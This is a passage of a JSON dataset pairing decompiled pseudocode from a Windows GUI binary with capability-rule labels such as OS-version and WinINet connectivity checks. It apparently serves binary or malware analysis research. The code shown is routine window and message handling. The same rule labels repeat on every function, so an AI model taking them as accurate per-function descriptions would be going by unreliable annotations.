        "decompiled_code": "\nvoid __fastcall fcn.0044474c(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iStack16 = *(in_EAX + 0x30);\n    if (iStack16 != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            pcVar4 = fcn.004446d4;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.004446d4, &iStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = sub.user32.dll_GetWindow(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.004197d8(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "004447f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004447f0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + 1;\n    if ((*(in_EAX + 0xc4) == 1) && (*(in_EAX + 0x10a) != 0)) {\n        (**(in_EAX + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0044481c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044481c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + -1;\n    if ((*(in_EAX + 0xc4) == 0) && (*(in_EAX + 0x112) != 0)) {\n        (**(in_EAX + 0x110))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004448a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004448a8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(in_EAX + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.004197d8(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00444a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444a04(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    \n    if (*(*0x497c14 + 0x30) != 0) {\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x9c) == 0) {\n                uVar2 = fcn.0044705c();\n                pcVar4 = fcn.00444930;\n                sub.user32.dll_EnumWindows(fcn.00444930, uVar2);\n                if (*(in_EAX + 0x44) != 0) {\n                    cVar1 = fcn.0044764c();\n                    if (cVar1 != '\\0') {\n                        iVar3 = fcn.00406860();\n                        if (-1 < iVar3) {\n                            do {\n                                pcVar4 = *(*0x497c38 + iVar3 * 4);\n                                sub.user32.dll_ShowWindow();\n                                iVar3 = iVar3 + -1;\n                            } while (iVar3 != -1);\n                        }\n                    }\n                }\n                iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        pcVar4 = fcn.004197d8(0, pcVar4);\n                        sub.user32.dll_ShowOwnedPopups();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n            *(in_EAX + 0x9c) = *(in_EAX + 0x9c) + 1;\n        }\n        else if ((0 < *(in_EAX + 0x9c)) && (*(in_EAX + 0x9c) = *(in_EAX + 0x9c) + -1,  *(in_EAX + 0x9c) == 0)) {\n            if (*(in_EAX + 0x44) != 0) {\n                cVar1 = fcn.0044764c();\n                if (cVar1 != '\\0') {\n                    iVar3 = fcn.00406860();\n                    if (-1 < iVar3) {\n                        do {\n                            sub.user32.dll_ShowWindow();\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != -1);\n                    }\n                }\n            }\n            iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n            if (-1 < iVar3) {\n                do {\n                    fcn.004197d8(-(param_2 != '\\0'));\n                    sub.user32.dll_ShowOwnedPopups();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            (**(**(in_EAX + 0x98) + 8))();\n            fcn.00406a14(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 664
    },
    "00444b68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00444b68(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "00444b80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00444b80(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(in_EAX + 0x34) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "00444b98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00444b98(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x497c20) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040eb40();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.0044375c();\n        }\n        if (*param_2 == *0x497c20) {\n            fcn.00443ddc();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "00444bf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444bf0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x444c4d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x162) != 0) {\n        fcn.00405664();\n        (**(in_EAX + 0x160))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x444c54;\n    uStack24 = 0x444c4c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 211
    },
    "004453a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004453a8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0043ab74();\n    if (iVar2 != 0) {\n        return;\n    }\n    *0x497c24 = 1;\n    fcn.00444848();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    fcn.00444a04();\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar3 = fcn.00457a28();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 != 0) {\n            cVar1 = fcn.0044764c();\n            if (cVar1 == '\\0') {\n                uVar3 = fcn.0043d3d4(*(*(in_EAX + 0x44) + 0x48), 0, 0x40);\n                uVar3 = fcn.0043d3b4(uVar3);\n                uVar3 = fcn.00457a28(uVar3);\n                sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar3);\n                sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            }\n            else {\n                fcn.0043f1cc();\n            }\n            goto code_r0x0044546c;\n        }\n    }\n    fcn.0044405c();\ncode_r0x0044546c:\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "00445488": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445488(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.0043ab74();\n    if (iVar2 == 0) {\n        return;\n    }\n    *0x497c24 = 0;\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if (*(in_EAX + 0x44) == 0) goto code_r0x0044554f;\n    cVar1 = fcn.0044764c();\n    if (cVar1 != '\\0') {\n        uVar3 = fcn.00457a28(9);\n        sub.user32.dll_ShowWindow(uVar3);\n        goto code_r0x0044554f;\n    }\n    if ((*(in_EAX + 0x5b) == '\\0') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\ncode_r0x0044550b:\n        fcn.0044405c();\n    }\n    else {\n        uVar3 = fcn.00457a28();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 == 0) goto code_r0x0044550b;\n        sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n    }\n    uVar4 = (***0x492750)(1, 0, 0, 0x40);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    uVar4 = (***0x492750)(0, iVar2);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar2);\ncode_r0x0044554f:\n    iVar2 = *(in_EAX + 0x44);\n    if (((iVar2 != 0) && (*(iVar2 + 0x273) == '\\x01')) && (*(iVar2 + 0x57) == '\\0')) {\n        fcn.0043f1cc();\n        fcn.00441fc4();\n    }\n    fcn.004448a8();\n    fcn.00444a04();\n    if (*(*0x497c18 + 100) != 0) {\n        uVar3 = fcn.00457a28();\n        sub.user32.dll_SetFocus(uVar3);\n    }\n    if (*(in_EAX + 0x14a) != 0) {\n        (**(in_EAX + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 669
    },
    "00445674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00445674(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb8) != 0) {\n        iVar1 = sub.user32.dll_IsWindowUnicode(*param_2);\n        if (iVar1 == 0) {\n            iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n        else {\n            iVar1 = sub.user32.dll_IsDialogMessageW(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 184
    },
    "004456bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004456bc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x277) == '\\x02')) && (*(*0x497c18 + 0x6c) != 0)) &&\n       (*(*(*0x497c18 + 0x6c) + 0x277) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x29c), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 185
    },
    "00445834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00445834(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x152) != 0) {\n        (**(in_EAX + 0x150))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar3 = fcn.00457a28();\n        iVar4 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if ((iVar4 != 0) && (cVar1 = fcn.0040483c(),  cVar1 != '\\0')) {\n            uVar2 = 1;\n            goto code_r0x00445891;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00445891:\n    return CONCAT14(uVar2, uVar2);\n}\n",
        "token_count": 209
    },
    "0044593c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044593c(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char cStackY68;\n    int32_t *in_stack_ffffffc0;\n    \n    uVar4 = 0;\n    iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 0, param_1);\n    if (iVar3 == 0) goto code_r0x00445a46;\n    if (*param_2 == 0) {\ncode_r0x0044596d:\n        bVar1 = false;\n    }\n    else {\n        iVar3 = sub.user32.dll_IsWindowUnicode();\n        if (iVar3 == 0) goto code_r0x0044596d;\n        bVar1 = true;\n    }\n    in_stack_ffffffc0 = param_2;\n    if (bVar1) {\n        iVar3 = sub.user32.dll_PeekMessageW(param_2, 0, 0, 0, 1);\n    }\n    else {\n        iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1);\n    }\n    if (iVar3 != 0) {\n        uVar4 = 1;\n        if (param_2[1] == 0x12) {\n            *(in_EAX + 0xa4) = 1;\n        }\n        else {\n            in_stack_ffffffc0 = in_stack_ffffffc0 & 0xffff00ff;\n            if (*(in_EAX + 0x102) != 0) {\n                (**(in_EAX + 0x100))();\n            }\n            cVar2 = fcn.00447200();\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.00445800();\n                if ((cVar2 == '\\0') && (in_stack_ffffffc0 >> 8 == '\\0')) {\n                    cVar2 = fcn.004456bc();\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.0044570c();\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.00445674();\n                            if (cVar2 == '\\0') {\n                                sub.user32.dll_TranslateMessage();\n                                cStackY68 = param_2;\n                                if (cStackY68 == '\\0') {\n                                    sub.user32.dll_DispatchMessageA();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                                else {\n                                    sub.user32.dll_DispatchMessageW();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00445a46:\n    return CONCAT44(in_stack_ffffffc0, uVar4);\n}\n",
        "token_count": 654
    },
    "00445a8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445a8c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.004197b8();\n        puVar1 = fcn.00402ef0();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.00419680();\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00445ae8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445ae8(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xb0) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004197d8();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.00402f0c();\n                    fcn.004196cc();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00445bd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445bd4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.00402f74();\n    cVar1 = fcn.00445b78();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.00402f94();\n        fcn.00402f74(uVar3);\n        fcn.0040d9a8();\n    }\n    else {\n        fcn.00402f74();\n        cVar1 = fcn.00445b78();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xea) == 0) {\n                fcn.00402f74();\n                fcn.00445de0();\n                return;\n            }\n            fcn.00402f74();\n            (**(in_EAX + 0xe8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00445c64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445c64(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t lpRect;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hWnd;\n    uint var_ch;\n    uint lpCaption;\n    int32_t var_4h;\n    \n    iStack108 = 0x445c80;\n    var_4h = in_EAX;\n    iStack112 = fcn.00447014();\n    iVar2 = iStack112;\n    if (iStack112 == 0) {\n        iVar2 = *(var_4h + 0x30);\n    }\n    iStack108 = 2;\n    uStack116 = 0x445ca3;\n    hWnd = iStack112;\n    var_18h = (***0x49280c)();\n    uStack116 = 2;\n    uStack120 = *(var_4h + 0x30);\n    puStack124 = 0x445cb8;\n    var_1ch = (***0x49280c)();\n    if (var_18h != var_1ch) {\n        var_48h = 0x28;\n        puStack124 = &fcn.00445c64::var_48h;\n        iStack128 = var_18h;\n        iStack132 = 0x445cdb;\n        (***0x492724)();\n        var_54h = &fcn.00445c64::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        iStack112 = var_3ch - var_44h >> 1;\n        if (iStack112 < 0) {\n            iStack112 = iStack112 + ((var_3ch - var_44h & 1U) != 0);\n        }\n        iStack112 = iStack112 + var_44h;\n        uStack116 = 0;\n        uStack120 = *(var_4h + 0x30);\n        puStack124 = 0x445d23;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack124 = 0x445d2b;\n    var_14h = fcn.0043ad38();\n    puStack124 = 0x445d33;\n    var_20h = fcn.0043ab94();\n    puStack124 = 0x445d3e;\n    cVar1 = fcn.00444b68();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack128 = 0x445dcc;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    var_ch = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = iVar2;\n    if (var_18h != var_1ch) {\n        iVar2 = var_4ch - var_54h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_4ch - var_54h & 1U) != 0);\n        }\n        iVar3 = var_50h - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_50h - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_54h, 0, 0, 0x1d, 0x445dd3, arg_8h);\n    }\n    fcn.0043adfc();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.0043ab9c();\n    return;\n}\n",
        "token_count": 1101
    },
    "00445de0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00445e19)\n// WARNING: Removing unreachable block (ram,0x00445e40)\n\nvoid fcn.00445de0(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x445e9b;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.00405504();\n    arg_8h = 0x10;\n    fcn.004455f4();\n    uVar1 = fcn.004058fc();\n    fcn.004058fc(uVar1);\n    fcn.00445c64(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x445ea2;\n    uStack288 = 0x445e92;\n    fcn.0040546c();\n    uStack288 = 0x445e9a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 286
    },
    "00445eb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00445eb8(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    char cStack28;\n    uint uStack24;\n    \n    iVar4 = 0;\n    uStack24 = CONCAT31(uStack24._1_3_, 1);\n    arg_8h = &uStack24;\n    uVar3 = fcn.00445fe0(arg_8h);\n    cStack28 = param_1;\n    if (uVar3 == '\\0') {\n        iVar4 = *(*0x497c18 + 0x68);\n        if ((iVar4 != 0) && ((*(iVar4 + 0x1c) & 0x10) != 0)) {\n            cStack28 = '\\0';\n        }\n        if ((((iVar4 != 0) && (iVar2 = fcn.00457c44(),  iVar2 == -1)) && (*(iVar4 + 0x57) == '\\0')) &&\n           (*(iVar4 + 0x268) == 0)) {\n            cStack28 = '\\0';\n        }\n    }\n    if (cStack28 != '\\0') {\n        if (((iVar4 != 0) && (cVar1 = fcn.00457d34(),  cVar1 != '\\0')) && (*(iVar4 + 0x284) != 0)) {\n            uStack24 = fcn.00457a28();\n            cVar1 = fcn.0044667c();\n            if (cVar1 == '\\0') {\n                return uVar3;\n            }\n            uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            return uVar3;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xac) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2 & 0xffff, arg_8h);\n            }\n        }\n        else {\n            uStack24 = *(in_EAX + 0x30);\n            if (*(in_EAX + 0x44) != 0) {\n                uStack24 = fcn.00457a28();\n            }\n            cVar1 = fcn.0044667c();\n            if (cVar1 != '\\0') {\n                uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 618
    },
    "00445fe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
